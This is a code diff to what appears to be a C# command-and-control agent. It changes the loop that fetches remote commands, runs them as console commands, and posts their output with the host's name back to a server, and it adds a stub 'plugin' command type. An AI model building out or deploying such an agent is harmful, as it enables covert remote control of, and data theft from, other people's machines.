@@ -136,8 +136,15 @@ namespace client
                 // execute commands
                 
                 // don't pass another shell to this command shell!!!
-                foreach(string command in commandSet.commands){
-                    string result = await ConsoleCommand(command);
+                foreach(string[] command in commandSet.commands){
+                    string result;
+                    if (command[1] == "console"){
+                        result = await ConsoleCommand(command[0]);
+                    } else if (command[1] == "plugin") {
+                        result = await PluginCommand(command[0]);
+                    } else {
+                        result = "Failed";
+                    }
                     string responseBody = $"{{\"hostname\": \"{hostname}\",\"response\": \"{result}\"}}";
                     (bool l, string a) = await BuildAndSendHTTPRequest(new StringContent(responseBody));
                 }
@@ -145,6 +152,10 @@ namespace client
                 Console.WriteLine("Agent failed to fetch commands.");
             }
             
+        }
+
+        private async Task<string> PluginCommand(string command){
+            return "lala";
         }
 
         private async Task<string> ConsoleCommand(string command){
@@ -194,7 +205,7 @@ namespace client
     // class to hold command set
     public class CommandSet
     {
-        public LinkedList<String> commands {get; set;}
+        public LinkedList<String[]> commands {get; set;}
     }
 
 }
